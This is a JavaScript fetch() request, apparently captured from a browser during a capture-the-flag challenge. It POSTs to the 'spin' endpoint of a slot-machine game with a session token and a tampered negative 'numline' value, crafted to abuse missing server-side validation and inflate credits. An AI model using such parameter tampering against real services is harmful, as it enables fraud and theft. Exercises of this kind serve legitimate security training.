fetch("https://slots.jackfrosttower.com/api/v1/02b05459-0d09-4881-8811-9a2a7e28fd45/spin", {
  "headers": {
    "accept": "application/json",
    "accept-language": "en-US,en;q=0.9",
    "content-type": "application/x-www-form-urlencoded",
    "sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "x-ncash-token": "4d30eeda-13a3-4c4b-8804-4acb19f593a9"
  },
  "referrer": "https://slots.jackfrosttower.com/uploads/games/frostyslots-206983/index.html",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "betamount=10&numline=-200000&cpl=0.1",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
})
.then(response=>response.json())
.then(data => {
    console.log('Success: ', data)
})
.catch((error) => {
    console.error('Error: ', error)
});